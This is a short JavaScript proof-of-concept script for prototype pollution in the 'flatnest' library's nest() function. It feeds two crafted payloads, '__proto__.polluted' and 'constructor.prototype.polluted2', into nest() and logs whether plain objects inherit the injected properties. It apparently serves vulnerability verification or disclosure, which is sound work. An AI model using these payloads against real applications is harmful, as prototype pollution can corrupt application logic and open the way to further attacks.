import { nest } from 'flatnest';

const payload = JSON.parse('{"__proto__.polluted": "true"}');
console.log("Before pollution:", {}.polluted);
try {
    nest(payload);
} catch (e) {
    console.log("Error during nest:", e);
}
console.log("After pollution:", {}.polluted);

const payload2 = JSON.parse('{"constructor": {"prototype": {"polluted2": "true"}}}');
try {
    nest(payload2);
} catch (e) {
    console.log("Error during nest 2:", e);
}
console.log("After pollution 2:", {}.polluted2);
